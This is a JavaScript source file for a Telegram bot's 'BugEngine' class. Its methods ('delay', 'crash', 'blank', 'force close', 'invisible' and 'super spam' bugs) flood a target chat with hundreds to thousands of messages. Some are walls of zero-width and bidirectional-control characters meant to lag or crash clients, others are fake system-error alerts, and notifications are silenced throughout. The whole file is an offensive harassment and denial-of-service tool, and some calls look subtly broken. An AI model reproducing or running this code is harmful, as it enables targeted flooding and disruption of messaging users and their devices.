const Helpers = require('./helpers');

class BugEngine {
    constructor(bot) {
        this.bot = bot;
    }

    async executeDelayBug(chatId, targetNumber) {
        try {
            const count = parseInt(targetNumber) || 1000;
            const messages = [];
            
            for (let i = 0; i < count; i++) {
                messages.push({
                    chat_id: chatId,
                    text: `⚡ DELAY BUG ${i+1}/${count}\n▪️ Status: PROCESSING\n▪️ Time: ${new Date().toLocaleTimeString()}`,
                    parse_mode: 'HTML',
                    disable_notification: true
                });
                
                if (messages.length >= 30) {
                    await this.bot.sendMediaGroup(chatId, messages);
                    messages.length = 0;
                    await Helpers.delay(100);
                }
            }
            
            if (messages.length > 0) {
                await this.bot.sendMediaGroup(chatId, messages);
            }
            
            return true;
        } catch (error) {
            console.error('Delay Bug Error:', error);
            return false;
        }
    }

    async executeCrashBug(chatId, targetNumber) {
        try {
            const count = parseInt(targetNumber) || 500;
            const promises = [];
            
            for (let i = 0; i < count; i++) {
                promises.push(
                    this.bot.sendMessage(chatId, `💥 CRASH ${i+1}/${count}`, {
                        parse_mode: 'HTML',
                        disable_notification: true
                    })
                );
                
                if (i % 10 === 0) {
                    await Promise.all(promises);
                    promises.length = 0;
                    await Helpers.delay(50);
                }
            }
            
            await Promise.all(promises);
            return true;
        } catch (error) {
            console.error('Crash Bug Error:', error);
            return false;
        }
    }

    async executeBlankBug(chatId, targetNumber) {
        try {
            const count = parseInt(targetNumber) || 1000;
            const blankMessages = [
                ' '.repeat(1000),
                '\\u200b'.repeat(1000),
                '\\u2060'.repeat(1000),
                '\\u200d'.repeat(1000),
                '\\u2063'.repeat(1000)
            ];
            
            for (let i = 0; i < count; i++) {
                const randomBlank = blankMessages[Math.floor(Math.random() * blankMessages.length)];
                await this.bot.sendMessage(chatId, randomBlank, {
                    parse_mode: 'HTML',
                    disable_notification: true,
                    disable_web_page_preview: true
                });
                
                if (i % 50 === 0) await Helpers.delay(10);
            }
            
            return true;
        } catch (error) {
            console.error('Blank Bug Error:', error);
            return false;
        }
    }

    async executeForceCloseBug(chatId, targetNumber) {
        try {
            const count = parseInt(targetNumber) || 300;
            const forceMessages = [
                '🚫 FORCE CLOSE', '❌ CONNECTION TERMINATED',
                '⚡ SYSTEM CRASH', '💥 MEMORY LEAK',
                '⚠️ CRITICAL ERROR', '🔥 DATABASE CORRUPTED',
                '💀 SERVER UNRESPONSIVE', '☠️ KERNEL PANIC'
            ];
            
            for (let i = 0; i < count; i++) {
                const message = forceMessages[Math.floor(Math.random() * forceMessages.length)];
                await this.bot.sendMessage(chatId, `${message} ${i+1}/${count}`, {
                    parse_mode: 'HTML',
                    disable_notification: true
                });
                
                if (i % 20 === 0) await Helpers.delay(5);
            }
            
            return true;
        } catch (error) {
            console.error('Force Close Bug Error:', error);
            return false;
        }
    }

    async executeInvisibleBug(chatId, targetNumber) {
        try {
            const count = parseInt(targetNumber) || 100;
            const invisibleChars = [
                '\\u200b', '\\u2060', '\\u200d', 
                '\\u2063', '\\u200c', '\\u200e',
                '\\u200f', '\\u202a', '\\u202b',
                '\\u202c', '\\u202d', '\\u202e'
            ];
            
            for (let i = 0; i < count; i++) {
                let message = '';
                for (let j = 0; j < 100; j++) {
                    message += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
                }
                
                await this.bot.sendMessage(chatId, message, {
                    parse_mode: 'HTML',
                    disable_notification: true,
                    disable_web_page_preview: true
                });
                
                if (i % 10 === 0) await Helpers.delay(1);
            }
            
            return true;
        } catch (error) {
            console.error('Invisible Bug Error:', error);
            return false;
        }
    }

    async superSpam(chatId, count) {
        const spamTexts = [
            '🔥 SUPER SPAM', '💥 BOT CRASH',
            '⚡ SYSTEM OVERLOAD', '☠️ MEMORY EXHAUSTED',
            '💀 KERNEL PANIC', '⚠️ CRITICAL ERROR',
            '🚫 CONNECTION LOST', '❌ DATABASE CORRUPTED'
        ];
        
        for (let i = 0; i < count; i++) {
            const text = spamTexts[Math.floor(Math.random() * spamTexts.length)];
            await this.bot.sendMessage(chatId, `${text} ${i+1}/${count}`, {
                parse_mode: 'HTML',
                disable_notification: true
            });
            if (i % 50 === 0) await Helpers.delay(1);
        }
    }
}

module.exports = BugEngine;
